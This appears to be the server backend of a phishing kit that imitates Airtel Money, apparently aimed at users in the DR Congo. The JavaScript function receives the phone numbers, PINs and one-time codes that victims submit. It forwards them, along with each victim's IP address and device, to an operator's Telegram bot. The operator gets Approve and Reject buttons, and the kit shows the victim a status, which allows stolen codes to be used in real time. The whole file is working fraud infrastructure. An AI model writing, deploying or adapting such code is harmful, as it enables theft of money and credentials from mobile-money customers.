// POST /api/submit  → send Telegram log, return { requestId }
// GET  /api/submit?requestId=X → return { status: pending|approved|rejected }

export async function onRequest(context) {
  const { request, env } = context;

  if (request.method === 'GET') return handleGet(request, env);
  if (request.method === 'POST') return handlePost(request, env);
  return json({ error: 'method_not_allowed' }, 405);
}

/* ---------------------------------------------------------- */
async function handleGet(request, env) {
  const url = new URL(request.url);
  const id = url.searchParams.get('requestId');
  if (!id) return json({ status: 'pending' });
  const status = (await env.STATUS_KV.get('req:' + id)) || 'pending';
  return json({ status });
}

/* ---------------------------------------------------------- */
async function handlePost(request, env) {
  let body;
  try { body = await request.json(); }
  catch { return json({ error: 'invalid_json' }, 400); }

  const { type, phone, pin, otp, plan, amount, trial } = body;
  if (!type || !phone) return json({ error: 'missing_fields' }, 400);

  const requestId = randomId();
  const ip = clientIp(request);
  const ua = (request.headers.get('user-agent') || 'N/A').slice(0, 60);
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);

  /* ---- Build tappable log (uses <code> so mobile tap = copy) ---- */
  const lines = [
    `🔐 <b>Nouvelle Demande Airtel Money</b>`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `🔖 <b>Étape :</b> <code>${type === 'pin' ? 'MOBILE + PIN' : 'VÉRIFICATION OTP'}</code>`,
    `📱 <b>Mobile :</b> +243 <code>${escapeHtml(phone)}</code>`,
    type === 'pin'  ? `🔐 <b>Épingle :</b> <code>${escapeHtml(pin || '')}</code>` : null,
    type === 'otp'  ? `🔑 <b>Code OTP :</b> <code>${escapeHtml(otp || '')}</code>` : null,
    `📦 <b>Forfait :</b> <code>${escapeHtml(plan || 'N/A')}</code>`,
    amount ? `💰 <b>Montant :</b> <code>${Number(amount).toLocaleString('fr-CD')} CDF</code>` : null,
    `🔢 <b>Tentative :</b> <code>${trial} / 3</code>`,
    `🌐 <b>IP :</b> <code>${escapeHtml(ip)}</code>`,
    `📱 <b>Appareil :</b> <code>${escapeHtml(ua)}</code>`,
    `🕒 <b>Heure :</b> <code>${now}</code>`,
    `🆔 <b>ID :</b> <code>${requestId}</code>`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `<i>Sélectionnez une action :</i>`,
  ].filter(Boolean).join('\n');

  /* ---- Send to Telegram with inline Approve / Reject ---- */
  const tgUrl = `https://api.telegram.org/bot${env.TG_BOT_TOKEN}/sendMessage`;
  const tgRes = await fetch(tgUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: env.TG_CHAT_ID,
      text: lines,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [[
          { text: '✅ APPROUVER', callback_data: `approve:${requestId}` },
          { text: '❌ REJETER',  callback_data: `reject:${requestId}`  },
        ]],
      },
    }),
  });

  if (!tgRes.ok) {
    const err = await tgRes.text();
    console.error('Telegram error:', err);
    return json({ error: 'telegram_failed' }, 502);
  }

  /* ---- Persist pending status (10 min TTL) ---- */
  await env.STATUS_KV.put('req:' + requestId, 'pending', { expirationTtl: 600 });

  return json({ ok: true, requestId });
}

/* ---------------------------------------------------------- */
function randomId() {
  return crypto.randomUUID().replace(/-/g, '').slice(0, 12);
}
function clientIp(req) {
  return req.headers.get('cf-connecting-ip')
      || req.headers.get('x-real-ip')
      || (req.headers.get('x-forwarded-for') || '').split(',')[0].trim()
      || 'N/A';
}
function escapeHtml(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { 'Content-Type': 'application/json' },
  });
}